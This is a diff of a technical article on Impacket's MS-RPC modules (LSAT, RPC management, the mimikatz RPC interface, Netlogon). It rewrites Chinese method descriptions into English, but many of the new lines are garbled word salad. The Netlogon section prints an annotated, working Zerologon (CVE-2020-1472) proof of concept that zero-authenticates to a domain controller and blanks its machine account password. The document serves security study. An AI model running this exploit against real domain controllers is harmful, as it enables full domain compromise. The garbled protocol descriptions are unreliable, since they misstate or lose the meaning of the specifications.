+31 : (LsarLookupPrivilegeValue, LsarLookupPrivilegeValueResponse),
+32 : (LsarLookupPrivilegeName, LsarLookupPrivilegeNameResponse),
+33 : (LsarLookupPrivilegeDisplayName, LsarLookupPrivilegeDisplayNameResponse),
+34 : (LsarDeleteObject, LsarDeleteObjectResponse),deletesobjectobjectordomainobject
+35 : (LsarEnumerateAccountsWithUserRight, LsarEnumerateAccountsWithUserRightResponse),returnsuser entryobjectlist
+36 : (LsarEnumerateAccountRights, LsarEnumerateAccountRightsResponse),
+37 : (LsarAddAccountRights, LsarAddAccountRightsResponse),
+38 : (LsarRemoveAccountRights, LsarRemoveAccountRightsResponse),
+42 : (LsarStorePrivateData, LsarStorePrivateDataResponse),
+43 : (LsarRetrievePrivateData, LsarRetrievePrivateDataResponse),retrieves
+44 : (LsarOpenPolicy2, LsarOpenPolicy2Response),opensRPC serveronhandledomainpolicymust
+46 : (LsarQueryInformationPolicy2, LsarQueryInformationPolicy2Response),queriesserverpolicy
+47 : (LsarSetInformationPolicy2, LsarSetInformationPolicy2Response),inserveronsetspolicy
+50 : (LsarEnumerateTrustedDomainsEx, LsarEnumerateTrustedDomainsExResponse),enumeratesserverdomainobject themethodinretrieves
+53 : (LsarQueryDomainInformationPolicy, LsarQueryDomainInformationPolicyResponse),
 
 ```
 
@@ -2031,7 +1703,7 @@ for key in keys:
                     self.__printSecret(key, secret)
 ```
 
-### [MS-LSAT]lsat.py
+### [MS-LSAT] lsat.py — SID ↔ Name Translation
 
 The Local Security Authority (Translation Methods) Remote Protocol converts security principal identifiers between human-readable and machine-readable forms.
 
@@ -2039,26 +1711,26 @@ The module implements the following interface methods:
 
 ```python
 OPNUMS = {
- 14 : (LsarLookupNames, LsarLookupNamesResponse),方法将一批安全主体名称转换为它们的SID形式。它还返回这些名称所属的域。
- 15 : (LsarLookupSids, LsarLookupSidsResponse),将一批安全主体 SID转换为其名称形式。它还返回这些名称所属的域。
- 45 : (LsarGetUserName, LsarGetUserNameResponse), 方法返回 调用该方法的安全主体的名称和域名。
+ 14 : (LsarLookupNames, LsarLookupNamesResponse),method principal nameasSIDreturnsnamedomain
+ 15 : (LsarLookupSids, LsarLookupSidsResponse),
+ 45 : (LsarGetUserName, LsarGetUserNameResponse), methodreturns themethodnamerealm
     
     
  57 : (LsarLookupSids2, LsarLookupSids2Response),
-接收 LsarLookupSids2 消息时所需的行为必须与接收 LsarLookupSids3 消息时的行为相同，但 有以下例外：此消息在非域控制器 计算机和域控制器上均有效。如果RPC 服务器不是域控制器，则 LsapLookupWksta 以外的LookupLevel值无效。
+ LsarLookupSids2 asmustwith LsarLookupSids3 as thisindomain domainonifRPC servernotdomainthen LsapLookupWksta LookupLevel
     
     
  58 : (LsarLookupNames2, LsarLookupNames2Response),
-接收 LsarLookupNames2 消息时所需的行为必须与接收 LsarLookupNames3 消息时的行为相同，但 有以下例外：TranslatedSids输出结构中的元素不包含Sid字段；相反，它们包含一个RelativeId字段。
+ LsarLookupNames2 asmustwith LsarLookupNames3 as TranslatedSids outputnotcontainingSidcontainingRelativeId
     
     
  68 : (LsarLookupNames3, LsarLookupNames3Response),
-接收 LsarLookupNames3 消息时所需的行为必须与接收 LsarLookupNames4 消息时的行为相同，但有以下例外：此消息在非域控制器 计算机和域控制器上均有效。如果以下条件都不成立，服务器必须返回 STATUS_ACCESS_DENIED
+ LsarLookupNames3 asmustwith LsarLookupNames4 asthisindomain domainonifnotservermustreturns STATUS_ACCESS_DENIED
     
  76 : (LsarLookupSids3, LsarLookupSids3Response),
-仅当 RPC 服务器是域控制器时，此消息才有效。如果 RPC 服务器不是域控制器，则 RPC 服务器必须在返回值中返回 STATUS_INVALID_SERVER_STATE。
+ RPC serverdomainthisif RPC servernotdomainthen RPC servermustinreturnsreturns STATUS_INVALID_SERVER_STATE
     
- 77 : (LsarLookupNames4, LsarLookupNames4Response), 仅当 RPC 服务器是域控制器时此消息才有效。如果 RPC 服务器不是域控制器，则必须在返回值中返回 STATUS_INVALID_SERVER_STATE。
+ 77 : (LsarLookupNames4, LsarLookupNames4Response),
 }
 ```
 
@@ -2070,24 +1742,24 @@ examples/lookupsid.py loops over the lsat interface enumerating SIDs, effectivel
         policyHandle = resp['PolicyHandle']
 
 # eg.lsat.py
-POLICY_LOOKUP_NAMES = 0x00000800  # 打开 Policy 对象时允许进行名称/SID 查询的访问掩码位
+POLICY_LOOKUP_NAMES = 0x00000800 # opens Policy objectname/SID queries
 ```
 
 Note: do not confuse `POLICY_LOOKUP_NAMES` (0x800) with user-right flags such as "deny remote interactive logon" — the values coincide but the concepts are unrelated (the former is an LSAD/LSAT access-mask bit, the latter an account privilege).
 
-### mgmt.py
+### mgmt.py — RPC Remote Management Interface
 
 Per the interface ID defined at the top, this is the RPC remote management interface (RPC Management). The module implements the following methods; Windows documentation on it is thin, so the method descriptions were cross-checked against the mgmt.c source of freedce (FreeDCE RPC and DCOM Toolkit for Linux):
 
 ```python
 OPNUMS = {
- 0 : (inq_if_ids, inq_if_idsResponse),查询if id向量，这是一个本地/远程管理函数，它获取一个接口标识向量，列出在 RPC runtime注册的接口。如果服务器未注册任何接口，此例程将返回 rpc_s_no_interfaces 状态代码和 NULL if_id_vector。应用程序负责调用rpc_if_id_vector_free 来释放vector 使用的内存。
+ 0 : (inq_if_ids, inq_if_idsResponse),queriesif id/obtains outputin RPC runtimeifserverthisreturns rpc_s_no_interfaces NULL if_id_vectorrpc_if_id_vector_free releasesvector
     
- 1 : (inq_stats, inq_statsResponse), 查询状态，用于获取指定服务器 RPC runtime 的统计信息。返回参数中的每个元素是一个整数值，对应定义好的统计常量
+ 1 : (inq_stats, inq_statsResponse), queriesused forobtainsspecifiedserver RPC runtime informationreturns
     
- 2 : (is_server_listening, is_server_listeningResponse),判断服务器是否监听
- 3 : (stop_server_listening, stop_server_listeningResponse),停止服务器监听
- 4 : (inq_princ_name, inq_princ_nameResponse),查询名称.这是一个管理器例程，它为远程调用者提供服务器的主体名称（实际上是主体名称之一）。
+ 2 : (is_server_listening, is_server_listeningResponse),
+ 3 : (stop_server_listening, stop_server_listeningResponse),
+ 4 : (inq_princ_name, inq_princ_nameResponse),queriesname.asserverprincipal nameonprincipal name
 }
 ```
 
@@ -2123,7 +1795,7 @@ The parameters of each interface:
 
 Readers interested in the concrete implementations can read the C source directly (https://fossies.org/dox/freedce-1.1.0.7/mgmt_8c_source.html)
 
-### mimilib.py
+### mimilib.py — mimikatz RPC Interface (MimiCommand)
 
 mimikatz defines its own RPC IDL interface. https://github.com/gentilkiwi/mimikatz/blob/e10bde5b16b747dc09ca5146f93f2beaf74dd17a/mimicom.idl
 
@@ -2135,41 +1807,27 @@ import "ms-dtyp.idl";
 ]
 interface MimiCom
 {
-	typedef [context_handle] void* MIMI_HANDLE;
+	typedef [context_handle] void* MIMI_HANDLE;    // session context handle: created by MimiBind, carried by later calls
 
-	typedef unsigned int ALG_ID;
-	typedef struct _MIMI_PUBLICKEY {
-		ALG_ID sessionType;
-		DWORD cbPublicKey;
-		[size_is(cbPublicKey)] BYTE *pbPublicKey;
-	} MIMI_PUBLICKEY, *PMIMI_PUBLICKEY;
-		
+	// Client and server exchange Diffie-Hellman public keys inside MimiBind;
+	// all subsequent command data is encrypted under the negotiated session key
 	NTSTATUS MimiBind(
 		[in] handle_t rpc_handle,
 		[in, ref] PMIMI_PUBLICKEY clientPublicKey,
 		[out, ref] PMIMI_PUBLICKEY serverPublicKey,
 		[out, ref] MIMI_HANDLE *phMimi
 	);
-	
-	NTSTATUS MiniUnbind(
-		[in, out, ref] MIMI_HANDLE *phMimi
-	);
+	......
 
-	NTSTATUS MimiCommand(
+	NTSTATUS MimiCommand(    // core method: carry an encrypted mimikatz command, return the encrypted result
 		[in, ref] MIMI_HANDLE phMimi,
 		[in] DWORD szEncCommand,
 		[in, size_is(szEncCommand), unique] BYTE *encCommand,
 		[out, ref] DWORD *szEncResult,
 		[out, size_is(, *szEncResult)] BYTE **encResult
 	);
-
-	NTSTATUS MimiClear(
-		[in] handle_t rpc_handle,
-		[in, string] wchar_t *command,
-		[out] DWORD *size,
-		[out, size_is(, *size)] wchar_t **result
-	);
-}
+	......
+};
 ```
 
 The mimilib module implements the corresponding interface methods:
@@ -2190,7 +1848,7 @@ The mimikatz RPC interface negotiates a session key via Diffie-Hellman key excha
   mimikatz # rpc::server
 ```
 
-### [MS-NRPC]nrpc.py
+### [MS-NRPC] nrpc.py — Netlogon Authentication & Zerologon (CVE-2020-1472)
 
 The protocol's name should ring a bell — Zerologon (CVE-2020-1472) lives right here.
 
@@ -2229,38 +1887,38 @@ Session key negotiation between client and server happens over an unprotected RP
 ![Session key negotiation](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ms-nrpc_files/image007.png)
 
 ```
-会话密钥协商的工作方式如下。
+session
 
-客户端绑定到服务器上的远程 Netlogon RPC端点。然后客户端生成一个nonce，称为client challenge，并将客户端challenge作为NetrServerReqChallenge 方法调用的输入参数发送到服务器。
+clientserveron Netlogon RPCclientnonceasclient challengeclientchallengeasNetrServerReqChallenge method entryserver
 
-服务器接收客户端的NetrServerReqChallenge调用。服务器生成自己的随机数，称为服务器challenge (SC)。在响应客户端的NetrServerReqChallenge方法调用时，服务器将 SC 作为NetrServerReqChallenge的输出参数发送回客户端。客户端收到服务器的响应后，两台计算机都有彼此的challenge随机数（分别为客户端挑战和服务器挑战 (SC)）。
+serverclientNetrServerReqChallengeserverasserverchallenge (SC)inclientNetrServerReqChallengemethodserver SC asNetrServerReqChallenge outputclientclientserverthischallengeasclientserver (SC)
 
-客户端计算会话密钥（session key），并通过 NegotiateFlags 提供一组初始能力标志。
+clientsessionsession key NegotiateFlags group
 
-客户端通过使用客户端challenge作为credential计算算法的输入来计算其客户端 Netlogon凭证
+clientclientchallengeascredential entryclient Netlogon
 
-客户端通过在NetrServerAuthenticate、 NetrServerAuthenticate2或NetrServerAuthenticate3 调用中将 client Netlogon credential作为 ClientCredential 输入参数传递，与服务器交换其客户端 Netlogon 凭据。
+clientinNetrServerAuthenticate NetrServerAuthenticate2orNetrServerAuthenticate3 client Netlogon credentialas ClientCredential entrywithserverclient Netlogon
 
-服务器接收NetrServerAuthenticate、NetrServerAuthenticate2或NetrServerAuthenticate3 调用并验证client Netlogon credential。它通过计算一个session key来实现这一点，复制client Netlogon credential计算，使用其存储的客户端challenge，并将此重新计算的结果与刚刚从客户端接收到的client Netlogon credential进行比较。如果比较失败，服务器必须在不进一步处理以下步骤的情况下使会话密钥协商失败。
+serverNetrServerAuthenticateNetrServerAuthenticate2orNetrServerAuthenticate3 client Netlogon credentialsession keyclient Netlogon credentialclientchallengethiswithclientclient Netlogon credentialifservermustinnotsession
 
-如果客户端 challenge 的前 5 个字节并非互不相同（即存在重复字节，有弱密钥风险），会话密钥协商必须失败。
+ifclient challenge 5 notinsessionmust
 
-服务器通过使用服务器challenge作为凭证计算算法的输入来计算其服务器 Netlogon 凭证。服务器返回server Netlogon credential作为NetrServerAuthenticate、NetrServerAuthenticate2或NetrServerAuthenticate3调用的ServerCredential 输出参数。
+serverserverchallengeas entryserver Netlogon serverreturnsserver Netlogon credentialasNetrServerAuthenticateNetrServerAuthenticate2orNetrServerAuthenticate3ServerCredential output
 
-客户端验证server Netlogon credential。它通过重新计算server Netlogon credential、使用其存储的服务器challenge并将此重新计算的结果与从服务器传回的server Netlogon credential进行比较来实现此目的。如果比较失败，客户端必须使session key协商失败。
+clientserver Netlogon credentialserver Netlogon credentialserverchallengethiswithserverserver Netlogon credentialthisifclientmustsession key
 
-在相互验证后，客户端和服务器同意使用计算出的会话密钥来加密和/或签署进一步的通信。
+inclientserver outputsession/or
 
-客户端调用NetrLogonGetCapabilities方法。
+clientNetrLogonGetCapabilitiesmethod
 
-服务器应该返回当前交换的协商标志(negotiated flags)。
+serverthereturnscurrent(negotiated flags)
 
-客户应该将接收到的ServerCapabilities与协商好的NegotiateFlag进行比较，如果有差异，则中止会话密钥协商。
+theServerCapabilitieswithNegotiateFlagifthensession
 
-客户端将ServerSessionInfo.LastAuthenticationTry（按服务器名称索引）设置为当前时间。这可以防止身份验证重试发生，除非收到新的传输通知。
+clientServerSessionInfo.LastAuthenticationTryservernamesetsascurrentcan
 
-在会话密钥协商的第一阶段 ( NetrServerReqChallenge )，客户端和服务器交换随机数。这允许客户端和服务器计算session key。为了提供相互身份验证，客户端和服务器都根据自己的随机数计算 Netlogon 凭据，使用计算出的 session key，并在会话密钥协商的第二阶段交换（NetrServerAuthenticate / NetrServerAuthenticate2 / NetrServerAuthenticate3）。 由于在第一阶段交换了随机数，这使得每一方都可以在本地计算对方的 Netlogon Credential，然后将其与收到的Credential进行比较。如果本地计算出的凭证与另一方提供的Credential相匹配，则向客户端和服务器证明双方有权访问共享机密。
-作为会话密钥 协商的一部分，客户端和服务器使用NetrServerAuthenticate2 或NetrServerAuthenticate3的NegotiateFlags参数 来协商对以下选项的支持。客户端通过NegotiateFlags提供一组初始功能参数作为输入到服务器。然后服务器选择它可接受的能力。服务器支持的功能与客户端支持的功能通过执行位与运算相结合；操作结果作为输出返回给客户端
+insession ( NetrServerReqChallenge )clientserverclientserversession keyasclientserver Netlogon output session keyinsessionNetrServerAuthenticate / NetrServerAuthenticate2 / NetrServerAuthenticate3 incanin Netlogon CredentialwithCredentialif outputwithCredentialthenclientservershare
+assession clientserverNetrServerAuthenticate2 orNetrServerAuthenticate3NegotiateFlags clientNegotiateFlagsgroupas entryserverserverserverwithclientwithas outputreturnsclient
 ```
 
 The meaning of each NegotiateFlags bit (bit 0 is the lowest):
@@ -2312,7 +1970,7 @@ ComputeSessionKey(SharedSecret, ClientChallenge,
       CALL SHA256Result(HashContext, SessionKey);
       SET SessionKey to lower 16 bytes of the SessionKey;
       
-强密钥（strong key）
+strong key
  SET zeroes to 4 bytes of 0
   
  ComputeSessionKey(SharedSecret, ClientChallenge,
@@ -2360,20 +2018,19 @@ Here is the Zerologon exploit code:
 
 ```python
 def try_zero_authenticate(dc_handle, dc_ip, target_computer):
-  # Connect to the DC's Netlogon service.
+  # Connect to the DC's Netlogon service (EPM resolves the endpoint -> connect -> bind)
   binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
   rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
   rpc_con.connect()
   rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
 
-  # Use an all-zero challenge and credential.
-  plaintext = b'\x00' * 8
-  ciphertext = b'\x00' * 8
+  # (1) The core trick: challenge and credential are both all zeros
+  plaintext = b'\x00' * 8      # ClientChallenge = 0
+  ciphertext = b'\x00' * 8     # ClientCredential = 0
 
-  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
+  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled
   flags = 0x212fffff
 
-  # Send challenge and authentication request.
   serverChallengeResp = nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
   serverChallenge = serverChallengeResp['ServerChallenge']
   try:
@@ -2381,64 +2038,29 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
       rpc_con, dc_handle + '\x00', target_computer+"$\x00", nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
       target_computer + '\x00', ciphertext, flags
     )
+    assert server_auth['ErrorCode'] == 0      # (2) each attempt passes verification with probability 1/256; on failure an exception is raised and we retry
+    ......
 
-    
-    # It worked!
-    assert server_auth['ErrorCode'] == 0
-    print()
-    server_auth.dump()
-    print("server challenge", serverChallenge)
-    #sessionKey = nrpc.ComputeSessionKeyAES(None,b'\x00'*8, serverChallenge, unhexlify("c9a22836bc33154d0821568c3e18e7ff")) # that ntlm is just a randomly generated machine hash from a lab VM, it's not sensitive
-    #print("session key", sessionKey)
+    IV = b'\x00'*16                            # the AES-CFB8 IV is fixed at all zeros
+    .....
+    authenticator = nrpc.NETLOGON_AUTHENTICATOR()
+    authenticator['Credential'] = ciphertext    # with an all-zero session key, an all-zero credential passes later checks
+    authenticator['Timestamp'] = b"\x00" * 4
 
-    try:
-      IV=b'\x00'*16
-      #Crypt1 = AES.new(sessionKey, AES.MODE_CFB, IV)
-      #serverCred = Crypt1.encrypt(serverChallenge)
-      #print("server cred", serverCred)
-      #clientCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
-      #clientCred = clientCrypt.encrypt(b'\x00'*8)
-      #print("client cred", clientCred)
-      #timestamp_var = 10
-      #clientStoredCred =  pack('<Q', unpack('<Q', b'\x00'*8)[0] + timestamp_var)
-      #print("client stored cred", clientStoredCred)
-      authenticator = nrpc.NETLOGON_AUTHENTICATOR()
-      #authenticatorCrypt = AES.new(sessionKey, AES.MODE_CFB, IV)
-      #authenticatorCred = authenticatorCrypt.encrypt(clientStoredCred);
-      #print("authenticator cred", authenticatorCred)
-      authenticator['Credential'] = ciphertext #authenticatorCred
-      authenticator['Timestamp'] = b"\x00" * 4 #0 # timestamp_var
-      #request = nrpc.NetrLogonGetCapabilities()
-      #request['ServerName'] = '\x00'*20
-      #request['ComputerName'] = target_computer + '\x00'
-      #request['Authenticator'] = authenticator
-      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
-      #request['ReturnAuthenticator']['Timestamp'] = 0 
-      #request['QueryLevel'] = 1
-      #resp = rpc_con.request(request)
-      #resp.dump()
-      
-      request = nrpc.NetrServerPasswordSet2()
-      request['PrimaryName'] = NULL
-      request['AccountName'] = target_computer + '$\x00'
-      request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
-      request['ComputerName'] = target_computer + '\x00'
-      request["Authenticator"] = authenticator
-      #request['ReturnAuthenticator']['Credential'] = b'\x00' * 8
-      #request['ReturnAuthenticator']['Timestamp'] = 0
-      request["ClearNewPassword"] = b"\x00"*516
-      resp = rpc_con.request(request)
-      resp.dump()
+    # (3) Use NetrServerPasswordSet2 to blank the machine account password (ClearNewPassword all zeros)
+    request = nrpc.NetrServerPasswordSet2()
+    request['PrimaryName'] = NULL
+    request['AccountName'] = target_computer + '$\x00'
+    request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+    request['ComputerName'] = target_computer + '\x00'
+    request["Authenticator"] = authenticator
+    request["ClearNewPassword"] = b"\x00"*516
+    resp = rpc_con.request(request)
+    resp.dump()
 
-      #request['PrimaryName'] = NULL
-      #request['ComputerName'] = target_computer + '\x00'
-      #request['OpaqueBuffer'] = b'HOLABETOCOMOANDAS\x00'
-      #request['OpaqueBufferSize'] = len(b'HOLABETOCOMOANDAS\x00')
-      #resp = rpc_con.request(request)
-      #resp.dump()      
-    except Exception as e:
-      print(e)
     return rpc_con
+  except Exception as e:
+    print(e)
 
 
 def perform_attack(dc_handle, dc_ip, target_computer):
@@ -2462,65 +2084,67 @@ def perform_attack(dc_handle, dc_ip, target_computer):
 MAX_ATTEMPTS = 2000
 ```
 
+> Excerpt note: the original PoC also carries long blocks of commented-out debug code (NetrLogonGetCapabilities probing, manual sessionKey derivation, NetrLogonSendToSam, ...) unrelated to the attack chain — omitted here.
+
 The code zeroes both challenge and credential, retries until authentication succeeds, then blanks the DC machine account password via NetrServerPasswordSet2. Each attempt succeeds with probability 1/256, independently, so N attempts succeed at least once with probability `1-(255/256)**N` — 99.96% over 2000 attempts.
 
 Next let's see which Netlogon methods the module implements:
 
 ```python
 OPNUMS = {
- 0 : (NetrLogonUasLogon, NetrLogonUasLogonResponse),登录方法，已过时
- 1 : (NetrLogonUasLogoff, NetrLogonUasLogoffResponse),登出方法，已过时
- 2 : (NetrLogonSamLogon, NetrLogonSamLogonResponse),NetrLogonSamLogonWithFlags 方法的前身
- 3 : (NetrLogonSamLogoff, NetrLogonSamLogoffResponse),更新SAM账户的用户lastLogoff 属性。
- 4 : (NetrServerReqChallenge, NetrServerReqChallengeResponse),接收客户端挑战并返回服务器挑战（SC）。
- 5 : (NetrServerAuthenticate, NetrServerAuthenticateResponse),NetrServerAuthenticate3 方法的前身。
+ 0 : (NetrLogonUasLogon, NetrLogonUasLogonResponse),
+ 1 : (NetrLogonUasLogoff, NetrLogonUasLogoffResponse),
+ 2 : (NetrLogonSamLogon, NetrLogonSamLogonResponse),NetrLogonSamLogonWithFlags methodpredecessor of
+ 3 : (NetrLogonSamLogoff, NetrLogonSamLogoffResponse),
+ 4 : (NetrServerReqChallenge, NetrServerReqChallengeResponse),
+ 5 : (NetrServerAuthenticate, NetrServerAuthenticateResponse),NetrServerAuthenticate3 methodpredecessor of。
 # 6 : (NetrServerPasswordSet, NetrServerPasswordSetResponse),
- 7 : (NetrDatabaseDeltas, NetrDatabaseDeltasResponse),返回在数据库序列号的特定值之后对SAM 数据库、SAM 内置数据库或LSA 数据库执行的一组更改（或增量）。BDC使用它从PDC请求BDC上缺少的数据库 更改。
- 8 : (NetrDatabaseSync, NetrDatabaseSyncResponse),NetrDatabaseSync2 方法的前身
-# 9 : (NetrAccountDeltas, NetrAccountDeltasResponse),方法过时
-# 10 : (NetrAccountSync, NetrAccountSyncResponse),方法过时
- 11 : (NetrGetDCName, NetrGetDCNameResponse),用于检索指定域的PDC的NetBIOS 名称。
- 12 : (NetrLogonControl, NetrLogonControlResponse),NetrLogonControl2Ex 方法的前身
- 13 : (NetrGetAnyDCName, NetrGetAnyDCNameResponse),用于检索指定主域或直接信任域中域控制器的名称 。只有 DC 可以返回指定的直接信任域中的 DC 的名称。
- 14 : (NetrLogonControl2, NetrLogonControl2Response),NetrLogonControl2Ex 方法的前身
- 15 : (NetrServerAuthenticate2, NetrServerAuthenticate2Response),是NetrServerAuthenticate3 方法的前身
- 16 : (NetrDatabaseSync2, NetrDatabaseSync2Response),返回一组自创建以来应用于指定数据库的所有更改。它为 BDC 提供了一个接口，使其数据库与PDC的数据库完全同步. 由于要返回大量数据，因此在一次调用中返回所有更改可能会非常昂贵，因此此方法支持使用连续上下文在一系列调用中检索部分数据库更改，直到收到所有更改。由于系统重启等外部事件，一系列调用可能会提前终止。因此，该方法还支持在调用者指定的特定点重新启动一系列调用。调用者必须在本节详述的一系列调用期间跟踪同步进度。 
- 17 : (NetrDatabaseRedo, NetrDatabaseRedoResponse),由备份域控制器 (BDC)使用以从PDC请求有关单个账户的信息。
- 18 : (NetrLogonControl2Ex, NetrLogonControl2ExResponse),用于查询状态和控制 Netlogon 服务器
- 19 : (NetrEnumerateTrustedDomains, NetrEnumerateTrustedDomainsResponse),返回一组可信域的NetBIOS名称。
- 20 : (DsrGetDcName, DsrGetDcNameResponse),DsrGetDcNameEx2 方法的前身
- 21 : (NetrLogonGetCapabilities, NetrLogonGetCapabilitiesResponse),客户端使用NetrLogonGetCapabilities方法在建立安全通道后确认服务器功能
- 22 : (NetrLogonSetServiceBits, NetrLogonSetServiceBitsResponse),用于通知 Netlogon域控制器是否正在运行指定的服务
- 23 : (NetrLogonGetTrustRid, NetrLogonGetTrustRidResponse),用于从接收此调用的服务器获取指定域中的域控制器 用于建立安全通道 的密码的账户的RID 。
- 24 : (NetrLogonComputeServerDigest, NetrLogonComputeServerDigestResponse),使用 MD5 消息摘要算法计算消息的加密摘要，此方法由服务端调用以计算消息摘要
- 25 : (NetrLogonComputeClientDigest, NetrLogonComputeClientDigestResponse),使用 MD5 消息摘要算法计算消息的加密摘要，此方法由客户端调用以计算消息摘要
- 26 : (NetrServerAuthenticate3, NetrServerAuthenticate3Response),对客户端和服务器进行相互认证，建立会话密钥，用于客户端和服务器之间的安全通道 消息保护。它在NetrServerReqChallenge 方法之后调用
- 27 : (DsrGetDcNameEx, DsrGetDcNameExResponse),DsrGetDcNameEx2方法的前身
- 28 : (DsrGetSiteName, DsrGetSiteNameResponse),返回接收此调用的指定计算机的站点 名称
- 29 : (NetrLogonGetDomainInfo, NetrLogonGetDomainInfoResponse),返回描述指定客户端所属的当前域的信息
- 30 : (NetrServerPasswordSet2, NetrServerPasswordSet2Response),允许客户端为域控制器使用的账户设置一个新的明文密码，用于从客户端 建立安全通道。域成员应该使用此功能定期更改其机器账户密码。PDC使用此功能定期更改所有直接受信任 域的信任密码。
- 31 : (NetrServerPasswordGet, NetrServerPasswordGetResponse),允许 BDC 从域中具有PDC角色的 DC 获取机器账户密码
- 32 : (NetrLogonSendToSam, NetrLogonSendToSamResponse),允许 BDC 或RODC 将用户账户密码更改转发给PDC。它应该被客户端用来向服务器端的SAM数据库传送一个不透明的缓冲区。
- 33 : (DsrAddressToSiteNamesW, DsrAddressToSiteNamesWResponse),将套接字地址列表翻译成它们相应的站点名称
- 34 : (DsrGetDcNameEx2, DsrGetDcNameEx2Response),返回有关指定域和站点中的域控制器 (DC)的信息。如果AccountName 参数不为 NULL，并且匹配所请求功能（如Flags参数中定义）的 DC 在此方法调用期间响应，则该 DC 将验证 DC 账户数据库包含指定AccountName的账户 。接收此调用的服务器不需要是 DC。
- 35 : (NetrLogonGetTimeServiceParentDomain, NetrLogonGetTimeServiceParentDomainResponse),返回当前域的父域名称。该方法返回的域名适合传入NetrLogonGetTrustRid 方法和NetrLogonComputeClientDigest 方法。
- 36 : (NetrEnumerateTrustedDomainsEx, NetrEnumerateTrustedDomainsExResponse),返回 来自指定服务器的可信 域列表
- 37 : (DsrAddressToSiteNamesExW, DsrAddressToSiteNamesExWResponse),将套接字地址列表翻译成它们相应的站点名称和子网名称
- 38 : (DsrGetDcSiteCoverageW, DsrGetDcSiteCoverageWResponse),返回域控制器 覆盖的站点列表
- 39 : (NetrLogonSamLogonEx, NetrLogonSamLogonExResponse),提供对NetrLogonSamLogon的扩展
- 40 : (DsrEnumerateDomainTrusts, DsrEnumerateDomainTrustsResponse),从指定的服务器返回域信任的枚举列表
- 41 : (DsrDeregisterDnsHostRecords, DsrDeregisterDnsHostRecordsResponse),应该删除 指定域控制器注册的所有DNS SRV记录
- 42 : (NetrServerTrustPasswordsGet, NetrServerTrustPasswordsGetResponse),返回域中账户的加密当前和以前的密码。客户端调用此方法以从域控制器检索当前和以前的账户密码
- 43 : (DsrGetForestTrustInformation, DsrGetForestTrustInformationResponse),检索指定域控制器 (DC)的林或受指定 DC 的林信任的林的信任信息 
- 44 : (NetrGetForestTrustInformation, NetrGetForestTrustInformationResponse),检索成员域本身是其成员的林的信任 信息
- 45 : (NetrLogonSamLogonWithFlags, NetrLogonSamLogonWithFlagsResponse),处理 SAM 账户的登录请求
- 46 : (NetrServerGetTrustInfo, NetrServerGetTrustInfoResponse),从指定的服务器返回一个信息块。该信息包括特定账户的加密当前和以前的密码以及其他信任数据。
+ 7 : (NetrDatabaseDeltas, NetrDatabaseDeltasResponse),returnsinSAM SAM orLSA grouporBDCPDCBDCon
+ 8 : (NetrDatabaseSync, NetrDatabaseSyncResponse),NetrDatabaseSync2 methodpredecessor of
+# 9 : (NetrAccountDeltas, NetrAccountDeltasResponse),methodobsolete
+# 10 : (NetrAccountSync, NetrAccountSyncResponse),methodobsolete
+ 11 : (NetrGetDCName, NetrGetDCNameResponse),used forretrievesspecifieddomainPDCNetBIOS name。
+ 12 : (NetrLogonControl, NetrLogonControlResponse),NetrLogonControl2Ex methodpredecessor of
+ 13 : (NetrGetAnyDCName, NetrGetAnyDCNameResponse),used forretrievesspecifieddomainordomaindomainname DC canreturns the specifieddomain DC name
+ 14 : (NetrLogonControl2, NetrLogonControl2Response),NetrLogonControl2Ex methodpredecessor of
+ 15 : (NetrServerAuthenticate2, NetrServerAuthenticate2Response),
+ 16 : (NetrDatabaseSync2, NetrDatabaseSync2Response),returnsgroupused forspecifiedallas BDC withPDC. returnsthisinreturnsallthisthismethodoninretrievesalleventthisthemethodinspecifiedmustin
+ 17 : (NetrDatabaseRedo, NetrDatabaseRedoResponse),
+ 18 : (NetrLogonControl2Ex, NetrLogonControl2ExResponse),used forqueries Netlogon server
+ 19 : (NetrEnumerateTrustedDomains, NetrEnumerateTrustedDomainsResponse),returnsgroupdomainNetBIOSname
+ 20 : (DsrGetDcName, DsrGetDcNameResponse),DsrGetDcNameEx2 methodpredecessor of
+ 21 : (NetrLogonGetCapabilities, NetrLogonGetCapabilitiesResponse),clientNetrLogonGetCapabilitiesmethodinserver
+ 22 : (NetrLogonSetServiceBits, NetrLogonSetServiceBitsResponse),used for Netlogondomaininspecified
+ 23 : (NetrLogonGetTrustRid, NetrLogonGetTrustRidResponse),used forthisserverobtainsspecifieddomaindomain used for passwordRID
+ 24 : (NetrLogonComputeServerDigest, NetrLogonComputeServerDigestResponse),
+ 25 : (NetrLogonComputeClientDigest, NetrLogonComputeClientDigestResponse),
+ 26 : (NetrServerAuthenticate3, NetrServerAuthenticate3Response),
+ 27 : (DsrGetDcNameEx, DsrGetDcNameExResponse),DsrGetDcNameEx2methodpredecessor of
+ 28 : (DsrGetSiteName, DsrGetSiteNameResponse),returnsthisspecified name
+ 29 : (NetrLogonGetDomainInfo, NetrLogonGetDomainInfoResponse),returnsspecifiedclientcurrentdomaininformation
+ 30 : (NetrServerPasswordSet2, NetrServerPasswordSet2Response),
+ 31 : (NetrServerPasswordGet, NetrServerPasswordGetResponse),
+ 32 : (NetrLogonSendToSam, NetrLogonSendToSamResponse),
+ 33 : (DsrAddressToSiteNamesW, DsrAddressToSiteNamesWResponse),
+ 34 : (DsrGetDcNameEx2, DsrGetDcNameEx2Response),returns information aboutspecifieddomaindomain (DC)informationifAccountName notas NULLFlags DC inthismethodthenthe DC DC containingspecifiedAccountName thisservernot DC
+ 35 : (NetrLogonGetTimeServiceParentDomain, NetrLogonGetTimeServiceParentDomainResponse),returnscurrentdomainrealmthemethodreturnsrealm entryNetrLogonGetTrustRid methodNetrLogonComputeClientDigest method
